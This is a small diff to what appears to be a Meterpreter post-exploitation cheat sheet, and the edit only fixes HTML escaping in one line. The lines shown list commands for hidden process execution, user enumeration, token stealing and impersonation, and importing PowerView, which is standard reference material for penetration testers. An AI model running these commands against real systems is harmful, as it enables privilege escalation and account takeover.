@@ -6,7 +6,7 @@ Disable/Enable Mouse----uictl
 Execute a command (interact with process / create a hidden process)----execute -f cmd.exe -i -H
 Execute a command with arguments----execute -f cmd.exe -H -a "/c net users"
 Steal a token from PID----steal_token PID
-Impersonate a User Token----##load incognito; list tokens -u; impersonate_token '&lt;domain\user&gt;'
+Impersonate a User Token----##load incognito; list tokens -u; impersonate_token '<domain\user>'
 Spawn Process as Impersonated User----execute -f cmd.exe -i -H -t 
 Powershell Execute (load powershell)----powershell_execute "Get-ChildItem C:\Users\user -Recurse"
 Powershell Import----powershell_import /path/to/powerview.ps1
